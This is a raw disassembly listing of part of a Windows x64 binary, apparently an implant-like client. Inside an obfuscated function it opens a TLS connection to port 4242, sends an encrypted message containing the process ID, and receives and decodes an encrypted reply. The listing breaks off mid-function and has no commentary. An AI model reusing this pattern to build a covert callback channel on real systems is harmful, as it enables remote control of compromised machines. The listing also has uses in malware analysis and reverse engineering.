   140001ec5:	48 c7 84 24 10 04 00 	movq   $0x0,0x410(%rsp)
   140001ecc:	00 00 00 00 00 
   140001ed1:	48 c7 84 24 18 04 00 	movq   $0x0,0x418(%rsp)
   140001ed8:	00 00 00 00 00 
   140001edd:	48 c7 84 24 20 04 00 	movq   $0x0,0x420(%rsp)
   140001ee4:	00 00 00 00 00 
   140001ee9:	48 c7 84 24 28 04 00 	movq   $0x0,0x428(%rsp)
   140001ef0:	00 00 00 00 00 
   140001ef5:	48 c7 84 24 b0 00 00 	movq   $0x0,0xb0(%rsp)
   140001efc:	00 00 00 00 00 
   140001f01:	48 c7 84 24 b8 00 00 	movq   $0x0,0xb8(%rsp)
   140001f08:	00 00 00 00 00 
   140001f0d:	48 c7 84 24 c0 00 00 	movq   $0x0,0xc0(%rsp)
   140001f14:	00 00 00 00 00 
   140001f19:	48 c7 84 24 c8 00 00 	movq   $0x0,0xc8(%rsp)
   140001f20:	00 00 00 00 00 
   140001f25:	ff 15 e5 e5 00 00    	call   *0xe5e5(%rip)        # 140010510 <__imp_WSAStartup>
   140001f2b:	85 c0                	test   %eax,%eax
   140001f2d:	74 29                	je     140001f58 <g9_2_2lthb4+0x218>
   140001f2f:	bb 01 00 00 00       	mov    $0x1,%ebx
   140001f34:	0f 10 b4 24 d0 5d 00 	movups 0x5dd0(%rsp),%xmm6
   140001f3b:	00 
   140001f3c:	89 d8                	mov    %ebx,%eax
   140001f3e:	48 81 c4 e8 5d 00 00 	add    $0x5de8,%rsp
   140001f45:	5b                   	pop    %rbx
   140001f46:	5e                   	pop    %rsi
   140001f47:	5f                   	pop    %rdi
   140001f48:	5d                   	pop    %rbp
   140001f49:	41 5c                	pop    %r12
   140001f4b:	41 5d                	pop    %r13
   140001f4d:	41 5e                	pop    %r14
   140001f4f:	41 5f                	pop    %r15
   140001f51:	c3                   	ret
   140001f52:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001f58:	48 8d 9c 24 e0 01 00 	lea    0x1e0(%rsp),%rbx
   140001f5f:	00 
   140001f60:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140001f64:	48 8d bc 24 98 00 00 	lea    0x98(%rsp),%rdi
   140001f6b:	00 
   140001f6c:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140001f73:	00 00 
   140001f75:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001f7a:	45 31 c9             	xor    %r9d,%r9d
   140001f7d:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001f83:	31 c9                	xor    %ecx,%ecx
   140001f85:	4c 8d a4 24 b0 00 00 	lea    0xb0(%rsp),%r12
   140001f8c:	00 
   140001f8d:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140001f92:	48 8d 15 0f 92 00 00 	lea    0x920f(%rip),%rdx        # 14000b1a8 <.rdata+0x1a8>
   140001f99:	4c 89 64 24 38       	mov    %r12,0x38(%rsp)
   140001f9e:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   140001fa5:	00 00 
   140001fa7:	0f 11 84 24 14 02 00 	movups %xmm0,0x214(%rsp)
   140001fae:	00 
   140001faf:	c7 84 24 e0 01 00 00 	movl   $0x4,0x1e0(%rsp)
   140001fb6:	04 00 00 00 
   140001fba:	0f 11 84 24 20 02 00 	movups %xmm0,0x220(%rsp)
   140001fc1:	00 
   140001fc2:	c7 84 24 18 02 00 00 	movl   $0xfc0,0x218(%rsp)
   140001fc9:	c0 0f 00 00 
   140001fcd:	c7 84 24 28 02 00 00 	movl   $0x40001c,0x228(%rsp)
   140001fd4:	1c 00 40 00 
   140001fd8:	0f 11 84 24 e4 01 00 	movups %xmm0,0x1e4(%rsp)
   140001fdf:	00 
   140001fe0:	0f 11 84 24 f4 01 00 	movups %xmm0,0x1f4(%rsp)
   140001fe7:	00 
   140001fe8:	0f 11 84 24 04 02 00 	movups %xmm0,0x204(%rsp)
   140001fef:	00 
   140001ff0:	e8 63 09 00 00       	call   140002958 <AcquireCredentialsHandleA>
   140001ff5:	89 c3                	mov    %eax,%ebx
   140001ff7:	85 c0                	test   %eax,%eax
   140001ff9:	0f 85 3a 03 00 00    	jne    140002339 <g9_2_2lthb4+0x5f9>
   140001fff:	48 8d b4 24 30 03 00 	lea    0x330(%rsp),%rsi
   140002006:	00 
   140002007:	48 89 f1             	mov    %rsi,%rcx
   14000200a:	ff 15 18 e5 00 00    	call   *0xe518(%rip)        # 140010528 <__imp_gethostbyname>
   140002010:	49 89 c5             	mov    %rax,%r13
   140002013:	48 85 c0             	test   %rax,%rax
   140002016:	0f 84 14 03 00 00    	je     140002330 <g9_2_2lthb4+0x5f0>
   14000201c:	45 31 c0             	xor    %r8d,%r8d
   14000201f:	ba 01 00 00 00       	mov    $0x1,%edx
   140002024:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002029:	ff 15 19 e5 00 00    	call   *0xe519(%rip)        # 140010548 <__imp_socket>
   14000202f:	48 89 c5             	mov    %rax,%rbp
   140002032:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140002036:	0f 84 f4 02 00 00    	je     140002330 <g9_2_2lthb4+0x5f0>
   14000203c:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140002042:	b9 92 10 00 00       	mov    $0x1092,%ecx
   140002047:	4c 8d b4 24 a0 00 00 	lea    0xa0(%rsp),%r14
   14000204e:	00 
   14000204f:	66 44 89 84 24 a0 00 	mov    %r8w,0xa0(%rsp)
   140002056:	00 00 
   140002058:	ff 15 d2 e4 00 00    	call   *0xe4d2(%rip)        # 140010530 <__imp_htons>
   14000205e:	4d 8b 4d 18          	mov    0x18(%r13),%r9
   140002062:	4d 0f bf 45 12       	movswq 0x12(%r13),%r8
   140002067:	48 8d 8c 24 a4 00 00 	lea    0xa4(%rsp),%rcx
   14000206e:	00 
   14000206f:	66 89 84 24 a2 00 00 	mov    %ax,0xa2(%rsp)
   140002076:	00 
   140002077:	49 8b 11             	mov    (%r9),%rdx
   14000207a:	e8 59 73 00 00       	call   1400093d8 <memcpy>
   14000207f:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140002085:	4c 89 f2             	mov    %r14,%rdx
   140002088:	48 89 e9             	mov    %rbp,%rcx
   14000208b:	ff 15 8f e4 00 00    	call   *0xe48f(%rip)        # 140010520 <__imp_connect>
   140002091:	85 c0                	test   %eax,%eax
   140002093:	0f 88 af 02 00 00    	js     140002348 <g9_2_2lthb4+0x608>
   140002099:	48 8d 8c 24 c0 00 00 	lea    0xc0(%rsp),%rcx
   1400020a0:	00 
   1400020a1:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   1400020a6:	31 d2                	xor    %edx,%edx
   1400020a8:	49 89 f0             	mov    %rsi,%r8
   1400020ab:	4c 8d bc 24 94 00 00 	lea    0x94(%rsp),%r15
   1400020b2:	00 
   1400020b3:	48 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%rax
   1400020ba:	00 
   1400020bb:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1400020c0:	49 ba 00 00 00 00 01 	movabs $0x100000000,%r10
   1400020c7:	00 00 00 
   1400020ca:	4c 89 7c 24 50       	mov    %r15,0x50(%rsp)
   1400020cf:	41 b9 94 c1 00 00    	mov    $0xc194,%r9d
   1400020d5:	4c 8d 9c 24 e0 00 00 	lea    0xe0(%rsp),%r11
   1400020dc:	00 
   1400020dd:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400020e2:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   1400020e9:	00 
   1400020ea:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   1400020f1:	00 00 
   1400020f3:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   1400020fa:	00 
   1400020fb:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   140002102:	00 
   140002103:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   140002108:	4c 89 e1             	mov    %r12,%rcx
   14000210b:	48 c7 84 24 e0 00 00 	movq   $0x0,0xe0(%rsp)
   140002112:	00 00 00 00 00 
   140002117:	c7 84 24 94 00 00 00 	movl   $0x0,0x94(%rsp)
   14000211e:	00 00 00 00 
   140002122:	48 c7 84 24 e8 00 00 	movq   $0x0,0xe8(%rsp)
   140002129:	00 00 00 00 00 
   14000212e:	4c 89 94 24 d0 00 00 	mov    %r10,0xd0(%rsp)
   140002135:	00 
   140002136:	4c 89 9c 24 d8 00 00 	mov    %r11,0xd8(%rsp)
   14000213d:	00 
   14000213e:	c7 84 24 e4 00 00 00 	movl   $0x2,0xe4(%rsp)
   140002145:	02 00 00 00 
   140002149:	4c 89 7c 24 68       	mov    %r15,0x68(%rsp)
   14000214e:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140002153:	e8 d0 07 00 00       	call   140002928 <InitializeSecurityContextA>
   140002158:	3d 12 03 09 00       	cmp    $0x90312,%eax
   14000215d:	0f 85 09 02 00 00    	jne    14000236c <g9_2_2lthb4+0x62c>
   140002163:	44 8b 84 24 e0 00 00 	mov    0xe0(%rsp),%r8d
   14000216a:	00 
   14000216b:	45 85 c0             	test   %r8d,%r8d
   14000216e:	74 3c                	je     1400021ac <g9_2_2lthb4+0x46c>
   140002170:	48 8b 94 24 e8 00 00 	mov    0xe8(%rsp),%rdx
   140002177:	00 
   140002178:	48 85 d2             	test   %rdx,%rdx
   14000217b:	74 2f                	je     1400021ac <g9_2_2lthb4+0x46c>
   14000217d:	45 31 c9             	xor    %r9d,%r9d
   140002180:	48 89 e9             	mov    %rbp,%rcx
   140002183:	ff 15 b7 e3 00 00    	call   *0xe3b7(%rip)        # 140010540 <__imp_send>
   140002189:	48 8b 8c 24 e8 00 00 	mov    0xe8(%rsp),%rcx
   140002190:	00 
   140002191:	89 c6                	mov    %eax,%esi
   140002193:	e8 a0 07 00 00       	call   140002938 <FreeContextBuffer>
   140002198:	48 c7 84 24 e8 00 00 	movq   $0x0,0xe8(%rsp)
   14000219f:	00 00 00 00 00 
   1400021a4:	85 f6                	test   %esi,%esi
   1400021a6:	0f 8e c0 01 00 00    	jle    14000236c <g9_2_2lthb4+0x62c>
   1400021ac:	89 5c 24 78          	mov    %ebx,0x78(%rsp)
   1400021b0:	45 31 ff             	xor    %r15d,%r15d
   1400021b3:	f3 0f 7e 35 8d 90 00 	movq   0x908d(%rip),%xmm6        # 14000b248 <base64_chars+0x48>
   1400021ba:	00 
   1400021bb:	48 8d b4 24 d0 1d 00 	lea    0x1dd0(%rsp),%rsi
   1400021c2:	00 
   1400021c3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400021c8:	44 89 fa             	mov    %r15d,%edx
   1400021cb:	41 b8 00 40 00 00    	mov    $0x4000,%r8d
   1400021d1:	45 31 c9             	xor    %r9d,%r9d
   1400021d4:	48 89 e9             	mov    %rbp,%rcx
   1400021d7:	48 01 f2             	add    %rsi,%rdx
   1400021da:	45 29 f8             	sub    %r15d,%r8d
   1400021dd:	ff 15 55 e3 00 00    	call   *0xe355(%rip)        # 140010538 <__imp_recv>
   1400021e3:	85 c0                	test   %eax,%eax
   1400021e5:	0f 8e 7d 01 00 00    	jle    140002368 <g9_2_2lthb4+0x628>
   1400021eb:	4c 8b 6c 24 68       	mov    0x68(%rsp),%r13
   1400021f0:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
   1400021f5:	41 01 c7             	add    %eax,%r15d
   1400021f8:	4c 89 e1             	mov    %r12,%rcx
   1400021fb:	4c 8d b4 24 d0 09 00 	lea    0x9d0(%rsp),%r14
   140002202:	00 
   140002203:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   140002208:	48 ba 00 00 00 00 02 	movabs $0x200000000,%rdx
   14000220f:	00 00 00 
   140002212:	48 8d 9c 24 d0 0d 00 	lea    0xdd0(%rsp),%rbx
   140002219:	00 
   14000221a:	4c 89 6c 24 50       	mov    %r13,0x50(%rsp)
   14000221f:	41 b9 94 c1 00 00    	mov    $0xc194,%r9d
   140002225:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   14000222a:	45 31 c0             	xor    %r8d,%r8d
   14000222d:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140002234:	00 00 
   140002236:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   14000223d:	00 
   14000223e:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140002243:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   14000224a:	00 
   14000224b:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   140002252:	00 
   140002253:	48 89 94 24 d0 09 00 	mov    %rdx,0x9d0(%rsp)
   14000225a:	00 
   14000225b:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140002260:	48 c7 84 24 e0 0d 00 	movq   $0x0,0xde0(%rsp)
   140002267:	00 00 00 00 00 
   14000226c:	48 c7 84 24 e8 0d 00 	movq   $0x0,0xde8(%rsp)
   140002273:	00 00 00 00 00 
   140002278:	48 89 9c 24 d8 09 00 	mov    %rbx,0x9d8(%rsp)
   14000227f:	00 
   140002280:	48 89 b4 24 d8 0d 00 	mov    %rsi,0xdd8(%rsp)
   140002287:	00 
   140002288:	44 89 bc 24 d0 0d 00 	mov    %r15d,0xdd0(%rsp)
   14000228f:	00 
   140002290:	c7 84 24 d4 0d 00 00 	movl   $0x2,0xdd4(%rsp)
   140002297:	02 00 00 00 
   14000229b:	48 c7 84 24 e8 00 00 	movq   $0x0,0xe8(%rsp)
   1400022a2:	00 00 00 00 00 
   1400022a7:	66 0f d6 b4 24 e0 00 	movq   %xmm6,0xe0(%rsp)
   1400022ae:	00 00 
   1400022b0:	e8 73 06 00 00       	call   140002928 <InitializeSecurityContextA>
   1400022b5:	41 89 c5             	mov    %eax,%r13d
   1400022b8:	85 c0                	test   %eax,%eax
   1400022ba:	0f 84 00 01 00 00    	je     1400023c0 <g9_2_2lthb4+0x680>
   1400022c0:	3d 12 03 09 00       	cmp    $0x90312,%eax
   1400022c5:	74 0b                	je     1400022d2 <g9_2_2lthb4+0x592>
   1400022c7:	3d 18 03 09 80       	cmp    $0x80090318,%eax
   1400022cc:	0f 85 96 00 00 00    	jne    140002368 <g9_2_2lthb4+0x628>
   1400022d2:	44 8b 84 24 e0 00 00 	mov    0xe0(%rsp),%r8d
   1400022d9:	00 
   1400022da:	45 85 c0             	test   %r8d,%r8d
   1400022dd:	74 2c                	je     14000230b <g9_2_2lthb4+0x5cb>
   1400022df:	48 8b 94 24 e8 00 00 	mov    0xe8(%rsp),%rdx
   1400022e6:	00 
   1400022e7:	48 85 d2             	test   %rdx,%rdx
   1400022ea:	74 1f                	je     14000230b <g9_2_2lthb4+0x5cb>
   1400022ec:	45 31 c9             	xor    %r9d,%r9d
   1400022ef:	48 89 e9             	mov    %rbp,%rcx
   1400022f2:	ff 15 48 e2 00 00    	call   *0xe248(%rip)        # 140010540 <__imp_send>
   1400022f8:	48 8b 8c 24 e8 00 00 	mov    0xe8(%rsp),%rcx
   1400022ff:	00 
   140002300:	89 c3                	mov    %eax,%ebx
   140002302:	e8 31 06 00 00       	call   140002938 <FreeContextBuffer>
   140002307:	85 db                	test   %ebx,%ebx
   140002309:	7e 5d                	jle    140002368 <g9_2_2lthb4+0x628>
   14000230b:	41 81 fd 18 03 09 80 	cmp    $0x80090318,%r13d
   140002312:	0f 84 b0 fe ff ff    	je     1400021c8 <g9_2_2lthb4+0x488>
   140002318:	83 bc 24 e4 0d 00 00 	cmpl   $0x5,0xde4(%rsp)
   14000231f:	05 
   140002320:	74 76                	je     140002398 <g9_2_2lthb4+0x658>
   140002322:	45 31 ff             	xor    %r15d,%r15d
   140002325:	e9 9e fe ff ff       	jmp    1400021c8 <g9_2_2lthb4+0x488>
   14000232a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002330:	4c 89 e1             	mov    %r12,%rcx
   140002333:	ff 15 af e1 00 00    	call   *0xe1af(%rip)        # 1400104e8 <__imp_FreeCredentialsHandle>
   140002339:	ff 15 c9 e1 00 00    	call   *0xe1c9(%rip)        # 140010508 <__imp_WSACleanup>
   14000233f:	e9 eb fb ff ff       	jmp    140001f2f <g9_2_2lthb4+0x1ef>
   140002344:	0f 1f 40 00          	nopl   0x0(%rax)
   140002348:	48 89 e9             	mov    %rbp,%rcx
   14000234b:	ff 15 c7 e1 00 00    	call   *0xe1c7(%rip)        # 140010518 <__imp_closesocket>
   140002351:	4c 89 e1             	mov    %r12,%rcx
   140002354:	ff 15 8e e1 00 00    	call   *0xe18e(%rip)        # 1400104e8 <__imp_FreeCredentialsHandle>
   14000235a:	ff 15 a8 e1 00 00    	call   *0xe1a8(%rip)        # 140010508 <__imp_WSACleanup>
   140002360:	e9 ca fb ff ff       	jmp    140001f2f <g9_2_2lthb4+0x1ef>
   140002365:	0f 1f 00             	nopl   (%rax)
   140002368:	8b 5c 24 78          	mov    0x78(%rsp),%ebx
   14000236c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002371:	ff 15 59 e1 00 00    	call   *0xe159(%rip)        # 1400104d0 <__imp_DeleteSecurityContext>
   140002377:	4c 89 e1             	mov    %r12,%rcx
   14000237a:	ff 15 68 e1 00 00    	call   *0xe168(%rip)        # 1400104e8 <__imp_FreeCredentialsHandle>
   140002380:	48 89 e9             	mov    %rbp,%rcx
   140002383:	ff 15 8f e1 00 00    	call   *0xe18f(%rip)        # 140010518 <__imp_closesocket>
   140002389:	ff 15 79 e1 00 00    	call   *0xe179(%rip)        # 140010508 <__imp_WSACleanup>
   14000238f:	e9 a0 fb ff ff       	jmp    140001f34 <g9_2_2lthb4+0x1f4>
   140002394:	0f 1f 40 00          	nopl   0x0(%rax)
   140002398:	44 8b 84 24 e0 0d 00 	mov    0xde0(%rsp),%r8d
   14000239f:	00 
   1400023a0:	48 89 f1             	mov    %rsi,%rcx
   1400023a3:	45 29 c7             	sub    %r8d,%r15d
   1400023a6:	4d 89 c6             	mov    %r8,%r14
   1400023a9:	4a 8d 14 3e          	lea    (%rsi,%r15,1),%rdx
   1400023ad:	45 89 f7             	mov    %r14d,%r15d
   1400023b0:	e8 2b 70 00 00       	call   1400093e0 <memmove>
   1400023b5:	e9 0e fe ff ff       	jmp    1400021c8 <g9_2_2lthb4+0x488>
   1400023ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400023c0:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   1400023c6:	48 8d bc 24 60 01 00 	lea    0x160(%rsp),%rdi
   1400023cd:	00 
   1400023ce:	49 89 dd             	mov    %rbx,%r13
   1400023d1:	8b 5c 24 78          	mov    0x78(%rsp),%ebx
   1400023d5:	48 89 fa             	mov    %rdi,%rdx
   1400023d8:	48 8d 0d 71 8d 00 00 	lea    0x8d71(%rip),%rcx        # 14000b150 <.rdata+0x150>
   1400023df:	48 8d b4 24 30 02 00 	lea    0x230(%rsp),%rsi
   1400023e6:	00 
   1400023e7:	e8 b4 f0 ff ff       	call   1400014a0 <g5_2_2lthb4>
   1400023ec:	e8 7f 6f 00 00       	call   140009370 <getpid>
   1400023f1:	ba 00 01 00 00       	mov    $0x100,%edx
   1400023f6:	48 89 f1             	mov    %rsi,%rcx
   1400023f9:	49 89 f9             	mov    %rdi,%r9
   1400023fc:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140002400:	4c 8d 05 ce 8d 00 00 	lea    0x8dce(%rip),%r8        # 14000b1d5 <.rdata+0x1d5>
   140002407:	e8 44 f0 ff ff       	call   140001450 <snprintf>
   14000240c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002411:	ba 04 00 00 00       	mov    $0x4,%edx
   140002416:	4c 8d 84 24 10 01 00 	lea    0x110(%rsp),%r8
   14000241d:	00 
   14000241e:	e8 fd 04 00 00       	call   140002920 <QueryContextAttributesA>
   140002423:	85 c0                	test   %eax,%eax
   140002425:	0f 85 41 ff ff ff    	jne    14000236c <g9_2_2lthb4+0x62c>
   14000242b:	48 89 f1             	mov    %rsi,%rcx
   14000242e:	8b bc 24 10 01 00 00 	mov    0x110(%rsp),%edi
   140002435:	e8 c6 6f 00 00       	call   140009400 <strlen>
   14000243a:	44 8b 94 24 14 01 00 	mov    0x114(%rsp),%r10d
   140002441:	00 
   140002442:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140002447:	46 8d 1c 17          	lea    (%rdi,%r10,1),%r11d
   14000244b:	44 89 54 24 70       	mov    %r10d,0x70(%rsp)
   140002450:	45 8d 3c 03          	lea    (%r11,%rax,1),%r15d
   140002454:	49 63 cf             	movslq %r15d,%rcx
   140002457:	e8 74 6f 00 00       	call   1400093d0 <malloc>
   14000245c:	49 89 c2             	mov    %rax,%r10
   14000245f:	48 85 c0             	test   %rax,%rax
   140002462:	0f 84 04 ff ff ff    	je     14000236c <g9_2_2lthb4+0x62c>
   140002468:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   14000246d:	48 89 84 24 38 01 00 	mov    %rax,0x138(%rsp)
   140002474:	00 
   140002475:	89 f8                	mov    %edi,%eax
   140002477:	49 8d 0c 02          	lea    (%r10,%rax,1),%rcx
   14000247b:	44 8b 44 24 70       	mov    0x70(%rsp),%r8d
   140002480:	c7 84 24 34 01 00 00 	movl   $0x7,0x134(%rsp)
   140002487:	07 00 00 00 
   14000248b:	83 fa 08             	cmp    $0x8,%edx
   14000248e:	89 bc 24 30 01 00 00 	mov    %edi,0x130(%rsp)
   140002495:	c7 84 24 44 01 00 00 	movl   $0x1,0x144(%rsp)
   14000249c:	01 00 00 00 
   1400024a0:	89 94 24 40 01 00 00 	mov    %edx,0x140(%rsp)
   1400024a7:	48 89 8c 24 48 01 00 	mov    %rcx,0x148(%rsp)
   1400024ae:	00 
   1400024af:	0f 83 03 03 00 00    	jae    1400027b8 <g9_2_2lthb4+0xa78>
   1400024b5:	f6 c2 04             	test   $0x4,%dl
   1400024b8:	0f 85 39 03 00 00    	jne    1400027f7 <g9_2_2lthb4+0xab7>
   1400024be:	85 d2                	test   %edx,%edx
   1400024c0:	74 15                	je     1400024d7 <g9_2_2lthb4+0x797>
   1400024c2:	44 0f b6 9c 24 30 02 	movzbl 0x230(%rsp),%r11d
   1400024c9:	00 00 
   1400024cb:	44 88 19             	mov    %r11b,(%rcx)
   1400024ce:	f6 c2 02             	test   $0x2,%dl
   1400024d1:	0f 85 3b 03 00 00    	jne    140002812 <g9_2_2lthb4+0xad2>
   1400024d7:	48 01 c2             	add    %rax,%rdx
   1400024da:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400024df:	4c 89 54 24 68       	mov    %r10,0x68(%rsp)
   1400024e4:	45 31 c9             	xor    %r9d,%r9d
   1400024e7:	4c 01 d2             	add    %r10,%rdx
   1400024ea:	44 89 84 24 50 01 00 	mov    %r8d,0x150(%rsp)
   1400024f1:	00 
   1400024f2:	49 ba 00 00 00 00 03 	movabs $0x300000000,%r10
   1400024f9:	00 00 00 
   1400024fc:	4c 8d 84 24 f0 00 00 	lea    0xf0(%rsp),%r8
   140002503:	00 
   140002504:	48 89 94 24 58 01 00 	mov    %rdx,0x158(%rsp)
   14000250b:	00 
   14000250c:	48 8d 94 24 30 01 00 	lea    0x130(%rsp),%rdx
   140002513:	00 
   140002514:	48 89 54 24 70       	mov    %rdx,0x70(%rsp)
   140002519:	48 89 94 24 f8 00 00 	mov    %rdx,0xf8(%rsp)
   140002520:	00 
   140002521:	31 d2                	xor    %edx,%edx
   140002523:	c7 84 24 54 01 00 00 	movl   $0x6,0x154(%rsp)
   14000252a:	06 00 00 00 
   14000252e:	4c 89 94 24 f0 00 00 	mov    %r10,0xf0(%rsp)
   140002535:	00 
   140002536:	4c 89 44 24 78       	mov    %r8,0x78(%rsp)
   14000253b:	e8 00 04 00 00       	call   140002940 <EncryptMessage>
   140002540:	85 c0                	test   %eax,%eax
   140002542:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140002547:	0f 85 9d 02 00 00    	jne    1400027ea <g9_2_2lthb4+0xaaa>
   14000254d:	45 89 f8             	mov    %r15d,%r8d
   140002550:	4c 8b 3d e9 df 00 00 	mov    0xdfe9(%rip),%r15        # 140010540 <__imp_send>
   140002557:	45 31 c9             	xor    %r9d,%r9d
   14000255a:	48 89 c2             	mov    %rax,%rdx
   14000255d:	48 89 e9             	mov    %rbp,%rcx
   140002560:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140002565:	4c 89 bc 24 80 00 00 	mov    %r15,0x80(%rsp)
   14000256c:	00 
   14000256d:	41 ff d7             	call   *%r15
   140002570:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002575:	89 c6                	mov    %eax,%esi
   140002577:	e8 3c 6e 00 00       	call   1400093b8 <free>
   14000257c:	83 c6 01             	add    $0x1,%esi
   14000257f:	83 fe 01             	cmp    $0x1,%esi
   140002582:	0f 86 e4 fd ff ff    	jbe    14000236c <g9_2_2lthb4+0x62c>
   140002588:	45 31 c9             	xor    %r9d,%r9d
   14000258b:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140002591:	4c 89 ea             	mov    %r13,%rdx
   140002594:	48 89 e9             	mov    %rbp,%rcx
   140002597:	ff 15 9b df 00 00    	call   *0xdf9b(%rip)        # 140010538 <__imp_recv>
   14000259d:	85 c0                	test   %eax,%eax
   14000259f:	0f 8e 8f f9 ff ff    	jle    140001f34 <g9_2_2lthb4+0x1f4>
   1400025a5:	48 8d 8c 24 a0 01 00 	lea    0x1a0(%rsp),%rcx
   1400025ac:	00 
   1400025ad:	66 0f ef c9          	pxor   %xmm1,%xmm1
   1400025b1:	45 31 c9             	xor    %r9d,%r9d
   1400025b4:	45 31 c0             	xor    %r8d,%r8d
   1400025b7:	48 89 8c 24 08 01 00 	mov    %rcx,0x108(%rsp)
   1400025be:	00 
   1400025bf:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400025c4:	48 8d 94 24 00 01 00 	lea    0x100(%rsp),%rdx
   1400025cb:	00 
   1400025cc:	4c 89 ac 24 a8 01 00 	mov    %r13,0x1a8(%rsp)
   1400025d3:	00 
   1400025d4:	49 bd 00 00 00 00 04 	movabs $0x400000000,%r13
   1400025db:	00 00 00 
   1400025de:	c7 84 24 a4 01 00 00 	movl   $0x1,0x1a4(%rsp)
   1400025e5:	01 00 00 00 
   1400025e9:	89 84 24 a0 01 00 00 	mov    %eax,0x1a0(%rsp)
   1400025f0:	4c 89 ac 24 00 01 00 	mov    %r13,0x100(%rsp)
   1400025f7:	00 
   1400025f8:	0f 11 8c 24 b0 01 00 	movups %xmm1,0x1b0(%rsp)
   1400025ff:	00 
   140002600:	0f 11 8c 24 c0 01 00 	movups %xmm1,0x1c0(%rsp)
   140002607:	00 
   140002608:	0f 11 8c 24 d0 01 00 	movups %xmm1,0x1d0(%rsp)
   14000260f:	00 
   140002610:	e8 3b 03 00 00       	call   140002950 <DecryptMessage>
   140002615:	85 c0                	test   %eax,%eax
   140002617:	0f 85 4f fd ff ff    	jne    14000236c <g9_2_2lthb4+0x62c>
   14000261d:	44 8b 9c 24 b4 01 00 	mov    0x1b4(%rsp),%r11d
   140002624:	00 
   140002625:	41 83 fb 01          	cmp    $0x1,%r11d
   140002629:	74 22                	je     14000264d <g9_2_2lthb4+0x90d>
   14000262b:	83 bc 24 c4 01 00 00 	cmpl   $0x1,0x1c4(%rsp)
   140002632:	01 
   140002633:	0f 84 ec 01 00 00    	je     140002825 <g9_2_2lthb4+0xae5>
   140002639:	83 bc 24 d4 01 00 00 	cmpl   $0x1,0x1d4(%rsp)
   140002640:	01 
   140002641:	41 bb 03 00 00 00    	mov    $0x3,%r11d
   140002647:	0f 85 1f fd ff ff    	jne    14000236c <g9_2_2lthb4+0x62c>
   14000264d:	49 c1 e3 04          	shl    $0x4,%r11
   140002651:	48 8d 8c 24 d0 05 00 	lea    0x5d0(%rsp),%rcx
   140002658:	00 
   140002659:	42 8b bc 1c a0 01 00 	mov    0x1a0(%rsp,%r11,1),%edi
   140002660:	00 
   140002661:	4a 8b 94 1c a8 01 00 	mov    0x1a8(%rsp,%r11,1),%rdx
   140002668:	00 
   140002669:	49 89 f8             	mov    %rdi,%r8
   14000266c:	e8 67 6d 00 00       	call   1400093d8 <memcpy>
   140002671:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140002677:	4c 89 f2             	mov    %r14,%rdx
   14000267a:	c6 84 3c d0 05 00 00 	movb   $0x0,0x5d0(%rsp,%rdi,1)
   140002681:	00 
   140002682:	48 89 c1             	mov    %rax,%rcx
   140002685:	e8 16 ee ff ff       	call   1400014a0 <g5_2_2lthb4>
   14000268a:	85 c0                	test   %eax,%eax
   14000268c:	0f 85 da fc ff ff    	jne    14000236c <g9_2_2lthb4+0x62c>
   140002692:	4c 89 f1             	mov    %r14,%rcx
   140002695:	8b b4 24 10 01 00 00 	mov    0x110(%rsp),%esi
   14000269c:	e8 5f 6d 00 00       	call   140009400 <strlen>
   1400026a1:	44 8b 94 24 14 01 00 	mov    0x114(%rsp),%r10d
   1400026a8:	00 
   1400026a9:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1400026ae:	42 8d 14 16          	lea    (%rsi,%r10,1),%edx
   1400026b2:	44 89 94 24 8c 00 00 	mov    %r10d,0x8c(%rsp)
   1400026b9:	00 
   1400026ba:	44 8d 3c 02          	lea    (%rdx,%rax,1),%r15d
   1400026be:	49 63 cf             	movslq %r15d,%rcx
   1400026c1:	e8 0a 6d 00 00       	call   1400093d0 <malloc>
   1400026c6:	49 89 c5             	mov    %rax,%r13
